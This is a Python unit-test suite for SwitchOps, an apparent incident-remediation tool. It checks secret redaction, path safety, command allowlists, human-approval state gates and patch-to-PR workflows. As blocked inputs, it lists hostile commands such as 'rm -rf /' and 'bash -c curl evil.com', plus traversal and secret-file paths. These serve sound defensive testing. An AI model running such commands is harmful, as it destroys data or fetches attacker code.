"""
Comprehensive Test Suite for SwitchOps.
Implements the full test plan from Section 17 of the Technical Implementation Guide:
- Unit tests: validation, severity, state transitions, deduplication, secret redaction, path safety, approvals.
- Integration tests: Switch adapter normalization, orchestrator routing, real test runner execution, GitHub PR dispatch.
- End-to-end acceptance test.
"""

import os
import sys
import unittest
import time

# Ensure project root is on sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from switchops.core.security import redact_secrets, is_safe_path, is_command_allowed
from switchops.core.workflow import (
    WorkflowState,
    validate_transition,
    InvalidStateTransitionError,
    Evidence,
    Patch,
    TestRun,
    Approval,
)
from switchops.core.incident_engine import IncidentEngine, Incident, IncidentSeverity
from switchops.core.remediation_engine import RemediationEngine
from switchops.core.test_runner import TestRunner
from switchops.core.git_commander import GitCommander
from switchops.core.roi_telemetry import ROITelemetryTracker
from switchops.switch_bridge.adapter import SwitchAdapter
from switchops.switch_bridge.room_manager import SwitchOpsOrchestrator
from switchops.sample_apps.payments_service.app import PaymentsService, PaymentProcessingError


class TestSwitchOpsSecurityAndValidation(unittest.TestCase):
    """Unit tests covering security redaction, path restrictions, and command allowlists."""

    def test_secret_redaction(self):
        log_sample = "Error connecting with token: ghp_123456789012345678901234567890123456 and bearer eyJhbGciOi..."
        redacted = redact_secrets(log_sample)
        self.assertNotIn("ghp_1234", redacted)
        self.assertIn("[REDACTED_GITHUB_PAT]", redacted)
        self.assertIn("[REDACTED_TOKEN]", redacted)

    def test_path_traversal_and_forbidden_paths(self):
        workspace = os.path.abspath(".")
        # Valid path inside workspace
        self.assertTrue(is_safe_path("switchops/sample_apps/payments_service/app.py", workspace))
        # Directory traversal attempt
        self.assertFalse(is_safe_path("../../windows/system32/cmd.exe", workspace))
        # Forbidden paths
        self.assertFalse(is_safe_path(".env", workspace))
        self.assertFalse(is_safe_path(".git/config", workspace))
        self.assertFalse(is_safe_path("secrets/keys.json", workspace))

    def test_command_allowlist(self):
        # Allowed test commands
        self.assertTrue(is_command_allowed(["python", "-m", "unittest", "discover"]))
        self.assertTrue(is_command_allowed(["pytest", "-v"]))
        # Blocked commands
        self.assertFalse(is_command_allowed(["rm", "-rf", "/"]))
        self.assertFalse(is_command_allowed(["bash", "-c", "curl evil.com"]))
        self.assertFalse(is_command_allowed(["git", "push", "--force"]))


class TestWorkflowStateMachine(unittest.TestCase):
    """Unit tests validating state transitions and rejection of invalid jumps."""

    def test_valid_state_transitions(self):
        # RECEIVED -> TRIAGING
        validate_transition(WorkflowState.RECEIVED, WorkflowState.TRIAGING)
        # TRIAGING -> TRIAGED
        validate_transition(WorkflowState.TRIAGING, WorkflowState.TRIAGED)
        # TRIAGED -> AWAITING_FIX_APPROVAL
        validate_transition(WorkflowState.TRIAGED, WorkflowState.AWAITING_FIX_APPROVAL)
        # AWAITING_FIX_APPROVAL -> PATCH_APPROVED
        validate_transition(WorkflowState.AWAITING_FIX_APPROVAL, WorkflowState.PATCH_APPROVED)
        # PATCH_APPROVED -> TESTING
        validate_transition(WorkflowState.PATCH_APPROVED, WorkflowState.TESTING)
        # TESTING -> TEST_PASSED
        validate_transition(WorkflowState.TESTING, WorkflowState.TEST_PASSED)
        # TEST_PASSED -> AWAITING_PR_APPROVAL
        validate_transition(WorkflowState.TEST_PASSED, WorkflowState.AWAITING_PR_APPROVAL)
        # AWAITING_PR_APPROVAL -> CREATING_PR
        validate_transition(WorkflowState.AWAITING_PR_APPROVAL, WorkflowState.CREATING_PR)
        # CREATING_PR -> PR_CREATED
        validate_transition(WorkflowState.CREATING_PR, WorkflowState.PR_CREATED)

    def test_invalid_state_transitions_raise_error(self):
        # Direct jump from RECEIVED to PR_CREATED is prohibited
        with self.assertRaises(InvalidStateTransitionError):
            validate_transition(WorkflowState.RECEIVED, WorkflowState.PR_CREATED)

        # Jumping from TESTING directly to CREATING_PR without approval is prohibited
        with self.assertRaises(InvalidStateTransitionError):
            validate_transition(WorkflowState.TESTING, WorkflowState.CREATING_PR)


class TestIncidentEngineAndDeduplication(unittest.TestCase):
    """Unit tests for incident parsing, evidence extraction, and deduplication."""

    def setUp(self):
        self.engine = IncidentEngine(workspace_root=os.path.abspath("."))

    def test_duplicate_event_handling(self):
        payload = {
            "service_name": "payments-service",
            "error_type": "KeyError",
            "stack_trace": "File app.py line 37 KeyError: 'eur'",
        }
        inc1, is_dup1 = self.engine.ingest(payload)
        self.assertFalse(is_dup1)

        # Ingesting same payload should return duplicate flag
        inc2, is_dup2 = self.engine.ingest(payload)
        self.assertTrue(is_dup2)
        self.assertEqual(inc1.id, inc2.id)

    def test_evidence_based_triage(self):
        inc = self.engine.create_demo_incident()
        task = self.engine.triage(inc)

        self.assertEqual(inc.status, WorkflowState.TRIAGED)
        self.assertEqual(task.status, "COMPLETED")
        self.assertGreater(len(inc.evidence_list), 0)
        self.assertEqual(inc.confidence_level, "High")
        self.assertIn("Likely root cause", inc.likely_root_cause)


class TestIsolatedTestRunner(unittest.TestCase):
    """Unit test for the isolated test runner executing real process commands."""

    def setUp(self):
        self.runner = TestRunner(workspace_root=os.path.abspath("."))

    def test_run_real_unit_test(self):
        test_run = self.runner.run_tests(
            incident_id="INC-TEST",
            command=[sys.executable, "-m", "unittest", "switchops/sample_apps/payments_service/tests/test_payments.py"]
        )
        self.assertEqual(test_run.status, "PASSED")
        self.assertEqual(test_run.exit_code, 0)
        self.assertGreater(test_run.duration_ms, 0)
        output_text = test_run.stdout_reference + "\n" + test_run.stderr_reference
        self.assertIn("Ran 4 tests", output_text)


class TestP0CriticalCapabilities(unittest.TestCase):
    """Unit tests for the 6 P0 critical changes."""

    def setUp(self):
        self.workspace = os.path.abspath(".")
        self.app_path = os.path.join(self.workspace, "switchops", "sample_apps", "payments_service", "app.py")
        with open(self.app_path, "r", encoding="utf-8") as f:
            self.original_app_code = f.read()

    def tearDown(self):
        if self.original_app_code and os.path.exists(self.app_path):
            with open(self.app_path, "w", encoding="utf-8") as f:
                f.write(self.original_app_code)

    def test_llm_client_initialization_and_fallback(self):
        from switchops.core.llm_client import LLMClient
        client = LLMClient(provider="gemini", api_key="")
        self.assertFalse(client.is_configured)
        res = client.generate("Analyze this stack trace")
        self.assertEqual(res["model"], "offline-sre-engine")
        self.assertFalse(res["live"])

    def test_remediation_actual_patch_application_and_revert(self):
        from switchops.core.remediation_engine import RemediationEngine
        engine = RemediationEngine(workspace_root=self.workspace)
        inc_engine = IncidentEngine(workspace_root=self.workspace)
        inc = inc_engine.create_demo_incident()
        inc_engine.triage(inc)
        patch, task = engine.generate_patch(inc)

        # 1. Apply patch to disk
        applied = engine.apply_patch(patch)
        self.assertTrue(applied)
        with open(self.app_path, "r", encoding="utf-8") as f:
            patched_content = f.read()
        self.assertIn("clean_from = str(from_currency).upper().strip()", patched_content)

        # 2. Revert patch
        reverted = engine.revert_patch(patch)
        self.assertTrue(reverted)
        with open(self.app_path, "r", encoding="utf-8") as f:
            reverted_content = f.read()
        self.assertEqual(reverted_content, self.original_app_code)

    def test_test_runner_reports_environment(self):
        runner = TestRunner(workspace_root=self.workspace)
        test_run = runner.run_tests("INC-ENV-TEST")
        self.assertIn("Environment:", test_run.stdout_reference)

    def test_sqlite_persistence_preserves_records(self):
        from switchops.core.database import Database
        import tempfile
        temp_db = os.path.join(tempfile.gettempdir(), f"test_switchops_{int(time.time())}.db")
        db = Database(db_path=temp_db)
        
        engine = IncidentEngine(workspace_root=self.workspace)
        inc = engine.create_demo_incident()
        db.save_incident(inc)

        # Load back in fresh instance
        db2 = Database(db_path=temp_db)
        loaded = db2.load_all_incidents()
        self.assertTrue(any(row["id"] == inc.id for row in loaded))
        if os.path.exists(temp_db):
            os.remove(temp_db)

    def test_webhook_hmac_signature_validation(self):
        from switchops.core.security import verify_hmac_signature
        import hmac, hashlib
        secret = "super_secret_webhook_key"
        payload = b'{"event": "incident.created"}'
        sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

        # Valid signature
        self.assertTrue(verify_hmac_signature(payload, sig, secret))
        self.assertTrue(verify_hmac_signature(payload, f"sha256={sig}", secret))
        # Tampered payload
        self.assertFalse(verify_hmac_signature(b'{"tampered": true}', sig, secret))

    def test_dashboard_api_key_validation(self):
        from switchops.core.security import validate_api_key
        # Open in dev when expected is empty
        self.assertTrue(validate_api_key("anything", None))
        # Secure check when expected is set
        self.assertTrue(validate_api_key("Bearer my-secret-token", "my-secret-token"))
        self.assertFalse(validate_api_key("wrong-token", "my-secret-token"))

    def test_monitoring_webhook_adapters(self):
        from switchops.switch_bridge.monitoring_adapters import SentryWebhookAdapter, CloudWatchWebhookAdapter
        sentry_raw = {"project_name": "payments-api", "data": {"issue": {"title": "KeyError: 'eur' in convert_currency", "culprit": "payments.py:37"}}}
        sentry_norm = SentryWebhookAdapter.parse_event(sentry_raw)
        self.assertEqual(sentry_norm["source"], "sentry")
        self.assertEqual(sentry_norm["service_name"], "payments-api")

        cw_raw = {"AlarmName": "High5xxErrors", "NewStateReason": "Threshold breached > 5%"}
        cw_norm = CloudWatchWebhookAdapter.parse_event(cw_raw)
        self.assertEqual(cw_norm["source"], "cloudwatch")
        self.assertEqual(cw_norm["severity"], "Critical")

    def test_alternative_fix_on_test_failure(self):
        from switchops.core.remediation_engine import RemediationEngine
        engine = RemediationEngine(workspace_root=self.workspace)
        inc_engine = IncidentEngine(workspace_root=self.workspace)
        inc = inc_engine.create_demo_incident()
        inc_engine.triage(inc)
        fake_failed_run = TestRun(incident_id=inc.id, exit_code=1, status="FAILED")

        alt_patch, task = engine.suggest_alternative_fix(inc, fake_failed_run)
        self.assertIn("Refined", alt_patch.explanation)
        self.assertEqual(task.status, "COMPLETED")


class TestEndToEndWorkflow(unittest.TestCase):
    """Full End-to-End Acceptance Test specified in Section 17."""

    def setUp(self):
        self.workspace = os.path.abspath(".")
        self.app_path = os.path.join(self.workspace, "switchops", "sample_apps", "payments_service", "app.py")
        with open(self.app_path, "r", encoding="utf-8") as f:
            self.original_app_code = f.read()
        self.orchestrator = SwitchOpsOrchestrator(workspace_root=self.workspace)

    def tearDown(self):
        if self.original_app_code and os.path.exists(self.app_path):
            with open(self.app_path, "w", encoding="utf-8") as f:
                f.write(self.original_app_code)

    def test_full_incident_remediation_lifecycle(self):
        # 1. Ingest incident
        inc = self.orchestrator.create_or_ingest_incident()
        self.assertEqual(inc.status, WorkflowState.RECEIVED)

        # 2. Run Triage & synthesize patch
        inc, triage_task = self.orchestrator.run_triage(inc.id)
        self.assertEqual(inc.status, WorkflowState.AWAITING_FIX_APPROVAL)
        self.assertIsNotNone(self.orchestrator.sessions[inc.id]["patch"])

        # 3. Approve patch (Step 1 of approval) -> runs tests
        test_run = self.orchestrator.approve_patch(inc.id, reviewer="SeniorSRE")
        self.assertEqual(test_run.status, "PASSED")
        self.assertEqual(inc.status, WorkflowState.AWAITING_PR_APPROVAL)

        # 4. Approve PR (Step 2 of approval) -> creates branch and PR
        pr = self.orchestrator.approve_pr_creation(inc.id, reviewer="SeniorSRE")
        self.assertEqual(inc.status, WorkflowState.PR_CREATED)
        self.assertIn("github.com", pr.url)
        self.assertEqual(pr.status, "OPEN")

        # 5. Verify room messages contain PR link
        messages = self.orchestrator.switch_client.get_room_messages(inc.switch_room_id)
        self.assertTrue(any("Pull Request Created Successfully" in m["text"] for m in messages))

        # 6. Verify audit trail
        audits = [a for a in self.orchestrator.audit_log if a.incident_id == inc.id]
        self.assertGreaterEqual(len(audits), 4)

    def test_remediation_retry_after_failure(self):
        """P1 AI Agent: Tests handling failed tests and suggesting alternative fixes."""
        inc = self.orchestrator.create_or_ingest_incident()
        inc, _ = self.orchestrator.run_triage(inc.id)
        self.assertEqual(inc.status, WorkflowState.AWAITING_FIX_APPROVAL)

        # Simulate test failure transition
        session = self.orchestrator.sessions[inc.id]
        session["incident"].status = WorkflowState.TEST_FAILED
        fake_failure = TestRun(
            incident_id=inc.id,
            command_profile="python -m unittest",
            exit_code=1,
            status="FAILED",
            stdout_reference="",
            stderr_reference="AssertionError: currency failed validation",
            duration_ms=120
        )
        session["test_run"] = fake_failure

        # Call retry_remediation
        refined_patch, retry_task = self.orchestrator.retry_remediation(inc.id, reviewer="SeniorSRE")
        self.assertEqual(session["incident"].status, WorkflowState.AWAITING_FIX_APPROVAL)
        self.assertIn("Refined following test runner failure output", refined_patch.explanation)
        self.assertEqual(retry_task.status, "COMPLETED")

        # Verify Switch room was notified of alternative patch
        messages = self.orchestrator.switch_client.get_room_messages(inc.switch_room_id)
        self.assertTrue(any("Alternative Remediation Synthesized" in m["text"] for m in messages))


if __name__ == "__main__":
    unittest.main()
